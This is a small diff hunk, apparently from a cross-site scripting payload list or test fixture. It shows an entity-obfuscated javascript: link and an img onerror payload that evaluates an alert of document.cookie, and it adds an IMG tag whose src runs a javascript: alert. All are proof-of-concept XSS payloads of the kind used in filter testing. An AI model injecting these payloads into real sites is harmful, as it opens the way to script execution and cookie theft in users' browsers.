@@ -4,3 +4,4 @@
 <a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>
 
 <img src=x onerror="eval('alert(document.cookie)')"/>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
